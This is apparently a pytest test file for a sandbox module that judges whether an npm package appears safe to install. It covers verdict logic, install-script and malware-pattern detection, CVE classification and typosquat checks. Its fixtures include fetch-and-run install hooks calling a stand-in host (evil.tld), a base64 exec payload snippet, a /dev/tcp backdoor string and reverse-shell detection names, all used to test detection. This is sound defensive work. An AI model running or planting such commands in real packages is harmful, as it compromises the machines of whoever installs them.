"""Tests for ``sandbox_check`` — the sandbox deep-install phase logic (F29).

F27 extracted the snapshot/diff half of the interactive ``sandbox <pkg>`` check
into :mod:`sandbox_snapshot` and pinned it. The phases that *consume* it stayed
inline in ``interactive_shell()``, a ~450-line block that needs a TTY to reach,
so the part that actually decides whether the user is told "APPEARS SAFE TO
DOWNLOAD" had no test at all. F29 moved that logic into :mod:`sandbox_check`;
this module pins it.

The central property, asserted from several directions, is the one the follow-up
called out: **a check that did not run is never a pass.** Every blind phase — an
unreadable snapshot path, an unreadable installed file, a crashed CVE scanner, a
failed install, metadata that could not be fetched, a missing package directory —
must render ``INCONCLUSIVE`` and must never render the "APPEARS SAFE" language.

:func:`test_malware_pattern_table_is_defined_once` is the anti-drift guard: the
pattern tables must not be copied back into the CLI, or the tested copy and the
shipped copy could diverge without any test noticing.
"""

import re
from pathlib import Path

import pytest

import sandbox_check
from sandbox_check import (
    DANGEROUS_HIT_KEYWORDS,
    EXPECTED_INSTALL_DIRS,
    INSTALL_SCRIPT_HOOKS,
    MALWARE_PATTERNS,
    NEXT_STEP_TYPES,
    SandboxFindings,
    Verdict,
    analyze_install_scripts,
    build_verdict_summary,
    classify_cve_findings,
    classify_malware_hits,
    count_paths_under,
    decide_verdict,
    filter_suspicious_new_files,
    installed_package_dirname,
    is_expected_install_path,
    normalize_package_spec,
    scan_text_for_malware_patterns,
    typosquat_matches,
)

REPO_ROOT = Path(__file__).resolve().parents[1]
SRC_DIR = REPO_ROOT / "src"


class _FakeSeverity:
    """Stand-in for the scanners' Severity enum (has a ``.value``)."""

    def __init__(self, value: str) -> None:
        self.value = value


class _FakeFinding:
    def __init__(self, cve_id, title, severity):
        self.cve_id = cve_id
        self.title = title
        self.severity = severity


# ---------------------------------------------------------------------------
# The verdict table — the reason this module exists
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "has_dangers,incomplete,expected",
    [
        (False, False, Verdict.SAFE),
        (False, True, Verdict.INCONCLUSIVE),
        (True, False, Verdict.DANGER),
        (True, True, Verdict.DANGER),
    ],
)
def test_verdict_table(has_dangers, incomplete, expected):
    """Every cell of the 2x2 verdict table is pinned."""
    assert decide_verdict(has_dangers, incomplete) is expected


def test_blind_phase_downgrades_a_finding_free_run():
    """The headline property: no dangers + a blind phase is NOT a pass."""
    findings = SandboxFindings()
    findings.add_info("No install scripts detected")
    assert findings.verdict is Verdict.SAFE

    findings.mark_blind("Code analysis", "3 installed file(s) unreadable")

    assert findings.analysis_incomplete is True
    assert findings.verdict is Verdict.INCONCLUSIVE
    assert not findings.dangers


def test_inconclusive_verdict_never_renders_appears_safe():
    """The rendered panel must not tell the user a blind run looks safe."""
    summary = build_verdict_summary(Verdict.INCONCLUSIVE, "some-pkg")

    assert "APPEARS SAFE" not in summary.body
    assert "INCONCLUSIVE" in summary.body
    assert "NOT a clean bill of health" in summary.body
    assert summary.border_style == "bright_yellow"


def test_safe_verdict_renders_the_pass_language():
    summary = build_verdict_summary(Verdict.SAFE, "lodash")

    assert "APPEARS SAFE TO DOWNLOAD" in summary.body
    assert "npm install lodash" in summary.body
    assert summary.border_style == "bright_green"


def test_danger_verdict_reports_the_real_danger_count():
    summary = build_verdict_summary(Verdict.DANGER, "evil-pkg", danger_count=7)

    assert "DO NOT INSTALL" in summary.body
    assert "7" in summary.body
    assert "APPEARS SAFE" not in summary.body
    assert summary.border_style == "bright_red"


def test_each_verdict_has_a_distinct_next_step_type():
    """A blind run must not be labelled 'sandbox_safe' downstream either."""
    values = [NEXT_STEP_TYPES[v] for v in Verdict]

    assert len(set(values)) == len(values)
    assert NEXT_STEP_TYPES[Verdict.INCONCLUSIVE] != NEXT_STEP_TYPES[Verdict.SAFE]


def test_summary_next_step_type_matches_the_verdict():
    for verdict in Verdict:
        summary = build_verdict_summary(verdict, "pkg", 1)
        assert summary.verdict is verdict
        assert summary.next_step_type == NEXT_STEP_TYPES[verdict]


def test_verdict_panel_escapes_console_markup_in_the_package_name():
    """A bracket in the prompt input must not be parsed as a style tag."""
    summary = build_verdict_summary(Verdict.SAFE, "[bright_red]spoof[/bright_red]")

    assert r"\[bright_red]spoof" in summary.body
    # No UNESCAPED tag survives (a lone `[` would be parsed by Rich).
    assert re.search(r"(?<!\\)\[bright_red\]spoof", summary.body) is None


def test_danger_outranks_an_incomplete_analysis():
    findings = SandboxFindings()
    findings.mark_blind("CVE check", "1 scanner failed")
    findings.add_danger("🚨 postinstall script: Network backdoor (/dev/tcp)")

    assert findings.verdict is Verdict.DANGER


def test_mark_blind_surfaces_the_reason_as_a_warning():
    """A downgraded verdict with no stated cause is not actionable."""
    findings = SandboxFindings()
    findings.mark_blind("Install", "npm install failed")

    assert findings.blind_phases == [("Install", "npm install failed")]
    assert any("Install incomplete: npm install failed" in w for w in findings.warnings)


# ---------------------------------------------------------------------------
# Package spec normalization
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "raw,expected",
    [
        ("lodash", "lodash"),
        ("  lodash  ", "lodash"),
        ("'lodash'", "lodash"),
        ("@scope/pkg", "@scope/pkg"),
        ("lodash@4.17.21", "lodash@4.17.21"),
        ("https://npmjs.com/package/lodash", "lodash"),
        ("https://www.npmjs.com/package/lodash", "lodash"),
        ("https://www.npmjs.com/package/@scope/pkg", "@scope/pkg"),
        ("http://registry.npmjs.org/lodash", "lodash"),
        ("", ""),
    ],
)
def test_normalize_package_spec(raw, expected):
    assert normalize_package_spec(raw) == expected


def test_normalize_package_spec_passes_unknown_input_through():
    """An unusual-but-valid spec is not mangled into something wrong."""
    assert normalize_package_spec("github:user/repo") == "github:user/repo"


@pytest.mark.parametrize(
    "spec,expected",
    [
        ("lodash", "lodash"),
        ("lodash@4.17.21", "lodash"),
        ("lodash@latest", "lodash"),
        ("@scope/pkg", "@scope/pkg"),
        ("@scope/pkg@1.2.3", "@scope/pkg"),
        ("https://npmjs.com/package/lodash", "lodash"),
        ("", ""),
    ],
)
def test_installed_package_dirname(spec, expected):
    """A version spec used to point the code scan at a directory that never
    exists, silently skipping the entire malware phase."""
    assert installed_package_dirname(spec) == expected


def test_installed_package_dirname_keeps_the_full_scoped_path():
    """The old code scanned node_modules/@scope (the whole scope), not the pkg."""
    assert installed_package_dirname("@scope/pkg") == "@scope/pkg"
    assert installed_package_dirname("@scope/pkg").count("/") == 1


def test_installed_package_dirname_survives_a_malformed_scope():
    assert installed_package_dirname("@scope") == "@scope"


# ---------------------------------------------------------------------------
# Install-script analysis
# ---------------------------------------------------------------------------


def test_install_script_danger_is_detected():
    report = analyze_install_scripts(
        {"postinstall": "curl https://evil.tld/x.sh | bash", "test": "jest"}
    )

    assert report.hooks == ["postinstall"]
    assert report.dangers
    assert any("Downloads external content" in d for d in report.dangers)
    assert all("postinstall" in d for d in report.dangers)


def test_install_script_analysis_covers_every_lifecycle_hook():
    scripts = {hook: "eval(x)" for hook in INSTALL_SCRIPT_HOOKS}
    report = analyze_install_scripts(scripts)

    assert report.hooks == list(INSTALL_SCRIPT_HOOKS)
    assert len(report.dangers) == len(INSTALL_SCRIPT_HOOKS)


def test_benign_package_has_no_install_script_dangers():
    report = analyze_install_scripts({"test": "jest", "build": "tsc", "lint": "eslint ."})

    assert report.hooks == []
    assert report.has_hooks is False
    assert report.dangers == []


def test_declared_but_harmless_install_hook_is_reported_without_danger():
    report = analyze_install_scripts({"postinstall": "node ./scripts/patch-version.js"})

    assert report.hooks == ["postinstall"]
    assert report.dangers == []


@pytest.mark.parametrize("scripts", [None, "not-a-mapping", 42, []])
def test_install_script_analysis_tolerates_odd_metadata(scripts):
    """`npm view --json` output is not guaranteed; this must not raise mid-scan."""
    report = analyze_install_scripts(scripts)

    assert report.hooks == []
    assert report.dangers == []


def test_install_script_analysis_tolerates_a_non_string_body():
    report = analyze_install_scripts({"postinstall": ["curl", "evil.tld"]})

    assert report.hooks == ["postinstall"]


# ---------------------------------------------------------------------------
# Expected-location filter
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "path",
    [
        "node_modules/lodash/index.js",
        ".npm-cache/_cacache/index-v5/aa/bb",
        ".npm/_logs/2026-07-27-debug.log",
        "package.json",
        "package-lock.json",
        ".package-lock.json",
    ],
)
def test_npm_artifacts_are_expected(path):
    assert is_expected_install_path(path) is True


@pytest.mark.parametrize(
    "path",
    [
        ".ssh/id_rsa",
        ".bashrc",
        "payload.js",
        "sub/dir/backdoor.sh",
    ],
)
def test_dropped_payloads_are_not_expected(path):
    assert is_expected_install_path(path) is False


def test_lookalike_root_file_is_no_longer_treated_as_expected():
    """The inline filter asked `'package.json' in path`, so a payload named
    `evil-package.json` matched and was silently dropped."""
    assert is_expected_install_path("evil-package.json") is False
    assert is_expected_install_path("stolen-package-lock.json") is False


def test_payload_hidden_behind_a_node_modules_segment_is_not_expected():
    """`'node_modules/' in path` also matched `.ssh/node_modules/...`."""
    assert is_expected_install_path(".ssh/node_modules/authorized_keys") is False
    assert is_expected_install_path("home/.config/node_modules/x") is False


def test_filter_suspicious_new_files_keeps_only_the_unexpected():
    new_files = [
        "node_modules/lodash/index.js",
        "node_modules/.package-lock.json",
        ".npm-cache/_cacache/tmp/x",
        "package-lock.json",
        ".ssh/authorized_keys",
        "evil-package.json",
    ]

    assert filter_suspicious_new_files(new_files) == [
        ".ssh/authorized_keys",
        "evil-package.json",
    ]


def test_benign_install_produces_no_suspicious_files():
    new_files = [
        "node_modules/lodash/package.json",
        "node_modules/lodash/index.js",
        ".npm-cache/_cacache/content-v2/sha512/aa/bb/cc",
        "package-lock.json",
    ]

    assert filter_suspicious_new_files(new_files) == []


def test_dot_prefixed_npm_dirs_are_matched_not_stripped():
    """Regression: `lstrip("./")` strips a character SET, so ".npm-cache/x"
    became "npm-cache/x" and every cached file read as a dropped payload."""
    assert is_expected_install_path(".npm-cache/_cacache/tmp/x") is True
    assert is_expected_install_path("./.npm-cache/_cacache/tmp/x") is True
    assert is_expected_install_path("./package.json") is True
    # ...while a genuinely unexpected dot-file is still reported.
    assert is_expected_install_path(".npmrc-stolen") is False


def test_expected_path_matching_is_windows_separator_safe():
    assert is_expected_install_path("node_modules\\lodash\\index.js") is True
    assert is_expected_install_path(".ssh\\id_rsa") is False


def test_count_paths_under_is_segment_anchored():
    paths = [
        "node_modules/a.js",
        "node_modules/b/c.js",
        ".npm-cache/x",
        "my-node_modules/evil.js",
    ]

    assert count_paths_under(paths, "node_modules") == 2
    assert count_paths_under(paths, ".npm-cache") == 1


def test_every_expected_dir_is_a_bare_segment():
    """A trailing slash would break the segment comparison silently."""
    for name in EXPECTED_INSTALL_DIRS:
        assert "/" not in name


# ---------------------------------------------------------------------------
# Malware-pattern pass
# ---------------------------------------------------------------------------


def test_malware_patterns_detect_obvious_payload_code():
    hits = scan_text_for_malware_patterns(
        "const cp = require('child_process');\n"
        "cp.exec(Buffer.from(payload, 'base64').toString());"
    )

    assert any("child_process" in h for h in hits)
    assert any("exec()" in h for h in hits)
    assert any("base64" in h for h in hits)


def test_malware_patterns_are_quiet_on_plain_code():
    hits = scan_text_for_malware_patterns(
        "module.exports = function add(a, b) { return a + b; };"
    )

    assert hits == []


def test_scan_text_handles_empty_content():
    assert scan_text_for_malware_patterns("") == []


def test_malware_hits_split_into_dangers_and_warnings():
    hits = [
        ("a.js", "child_process - command execution"),
        ("b.js", "child_process - command execution"),
        ("a.js", "HTTP client"),
    ]

    report = classify_malware_hits(hits)

    assert report.counts["child_process - command execution"] == 2
    assert report.total_hits == 3
    assert any("child_process" in d and "2 occurrences" in d for d in report.dangers)
    assert any("HTTP client" in w for w in report.warnings)
    assert not any("HTTP client" in d for d in report.dangers)


def test_library_shaped_patterns_are_warnings_not_dangers():
    """`fs`/`http`/`process.env` are also ordinary library code — flagging them
    as dangers would make every real package a DO-NOT-INSTALL."""
    report = classify_malware_hits(
        [
            ("a.js", "filesystem access"),
            ("a.js", "environment variable access"),
            ("a.js", "HTTPS client"),
        ]
    )

    assert report.dangers == []
    assert len(report.warnings) == 3


def test_malware_classification_ordering_is_deterministic():
    hits = [("a.js", "eval() - dynamic code execution"), ("b.js", "HTTP client")]

    first = classify_malware_hits(hits)
    second = classify_malware_hits(hits)

    assert first.dangers == second.dangers
    assert list(first.counts) == list(second.counts)


def test_no_hits_yields_an_empty_classification():
    report = classify_malware_hits([])

    assert report.dangers == []
    assert report.warnings == []
    assert report.total_hits == 0


def test_every_dangerous_keyword_maps_to_at_least_one_pattern():
    """Anti-drift: a keyword with no matching pattern description is dead
    config that silently downgrades a class of hits to warnings."""
    descriptions = " ".join(desc for _, desc in MALWARE_PATTERNS).lower()

    for keyword in DANGEROUS_HIT_KEYWORDS:
        assert keyword in descriptions, keyword


# ---------------------------------------------------------------------------
# CVE classification
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("severity", ["CRITICAL", "HIGH", "critical", "high"])
def test_blocking_severities_become_dangers(severity):
    report = classify_cve_findings(
        [_FakeFinding("CVE-2025-0001", "RCE in dep", _FakeSeverity(severity))]
    )

    assert len(report.dangers) == 1
    assert "CVE-2025-0001" in report.dangers[0]
    assert report.warnings == []


@pytest.mark.parametrize("severity", ["MEDIUM", "LOW", "INFO"])
def test_non_blocking_severities_become_warnings(severity):
    report = classify_cve_findings(
        [_FakeFinding("CVE-2025-0002", "Minor issue", _FakeSeverity(severity))]
    )

    assert report.dangers == []
    assert len(report.warnings) == 1


def test_cve_classification_accepts_a_plain_string_severity():
    """Scanners differ; the classifier must not depend on the enum type."""
    report = classify_cve_findings([_FakeFinding("CVE-2025-3", "x", "HIGH")])

    assert len(report.dangers) == 1


def test_cve_classification_survives_a_finding_missing_fields():
    class _Bare:
        pass

    report = classify_cve_findings([_Bare()])

    assert report.found_any is True
    assert "UNKNOWN" in report.warnings[0]


def test_no_findings_is_not_found_any():
    assert classify_cve_findings([]).found_any is False
    assert classify_cve_findings(None).found_any is False


# ---------------------------------------------------------------------------
# Typosquatting
# ---------------------------------------------------------------------------


def test_typosquat_is_detected():
    matches = typosquat_matches("lodahs")

    assert matches
    assert matches[0][0] == "lodash"
    assert 0.75 < matches[0][1] < 1.0


def test_exact_popular_name_is_not_a_typosquat():
    assert typosquat_matches("lodash") == []
    assert typosquat_matches("react") == []


def test_unrelated_name_is_not_a_typosquat():
    assert typosquat_matches("shellockolm-scanner-fixtures") == []


def test_typosquat_uses_the_bare_name_not_the_version_spec():
    """A version suffix used to dilute the similarity ratio and hide a squat."""
    assert typosquat_matches("lodahs@1.0.0") == typosquat_matches("lodahs")


def test_typosquat_matches_are_sorted_most_similar_first():
    matches = typosquat_matches("expres")

    assert matches
    ratios = [ratio for _, ratio in matches]
    assert ratios == sorted(ratios, reverse=True)


def test_typosquat_on_empty_input_is_empty():
    assert typosquat_matches("") == []


# ---------------------------------------------------------------------------
# End-to-end phase composition (the shapes the CLI actually produces)
# ---------------------------------------------------------------------------


def test_clean_package_run_reaches_safe():
    """Every phase ran and found nothing -> APPEARS SAFE."""
    findings = SandboxFindings()
    script_report = analyze_install_scripts({"test": "jest"})
    findings.extend(dangers=script_report.dangers)
    findings.add_info("No install scripts detected")
    assert filter_suspicious_new_files(["node_modules/lodash/index.js"]) == []
    findings.add_info("No malware patterns detected in code")
    findings.add_info("No known CVEs")

    assert findings.verdict is Verdict.SAFE
    assert "APPEARS SAFE" in build_verdict_summary(findings.verdict, "lodash").body


def test_malicious_package_run_reaches_danger():
    findings = SandboxFindings()
    script_report = analyze_install_scripts(
        {"postinstall": "curl https://evil.tld/x | /bin/sh"}
    )
    findings.extend(dangers=script_report.dangers)
    for path in filter_suspicious_new_files(["node_modules/x/i.js", ".ssh/id_rsa"]):
        findings.add_danger(f"Suspicious file created: {path}")

    assert findings.verdict is Verdict.DANGER
    assert any(".ssh/id_rsa" in d for d in findings.dangers)


@pytest.mark.parametrize(
    "phase,reason",
    [
        ("Metadata analysis", "could not fetch package info"),
        ("Install", "npm install failed"),
        ("Baseline snapshot", "2 path(s) unreadable"),
        ("Post-install snapshot", "2 path(s) unreadable"),
        ("Code analysis", "node_modules/pkg not found"),
        ("Code analysis", "3 installed file(s) unreadable"),
        ("CVE check", "1 CVE scanner(s) failed"),
    ],
)
def test_every_blind_phase_produces_inconclusive(phase, reason):
    """Each way a phase can fail to run must downgrade the verdict.

    These are exactly the sites the inline version either did not mark at all
    (a failed install, an absent package directory, unfetchable metadata, a
    crashed CVE phase) or marked with a flag that had to be kept in sync by
    hand.
    """
    findings = SandboxFindings()
    findings.add_info("No malware patterns detected in code")
    findings.mark_blind(phase, reason)

    assert findings.verdict is Verdict.INCONCLUSIVE
    summary = build_verdict_summary(findings.verdict, "pkg")
    assert "APPEARS SAFE" not in summary.body


# ---------------------------------------------------------------------------
# Anti-drift mechanism guard
# ---------------------------------------------------------------------------


def test_malware_pattern_table_is_defined_once():
    """The pattern tables must live only in sandbox_check.

    If a copy is pasted back into the CLI, the tested table and the shipped one
    can diverge with every test still green.
    """
    sentinels = [
        "Netcat - reverse shell",
        "eval() - dynamic code execution",
        "Function constructor - dynamic code",
    ]

    for sentinel in sentinels:
        owners = [
            path.name
            for path in SRC_DIR.rglob("*.py")
            if sentinel in path.read_text(encoding="utf-8", errors="ignore")
        ]
        assert owners == ["sandbox_check.py"], (sentinel, owners)


def test_cli_consumes_the_extracted_module():
    """The CLI must call the tested logic, not a re-inlined copy."""
    cli_source = (SRC_DIR / "cli.py").read_text(encoding="utf-8", errors="ignore")

    assert "from sandbox_check import" in cli_source
    assert "build_verdict_summary" in cli_source
    # The hand-synced flag the verdict used to depend on is gone.
    assert "analysis_incomplete = True" not in cli_source


def test_module_is_pure_no_io_imports():
    """sandbox_check must stay free of filesystem/subprocess/console imports."""
    source = Path(sandbox_check.__file__).read_text(encoding="utf-8")

    for forbidden in ("import subprocess", "import shutil", "from rich", "import os"):
        assert forbidden not in source, forbidden
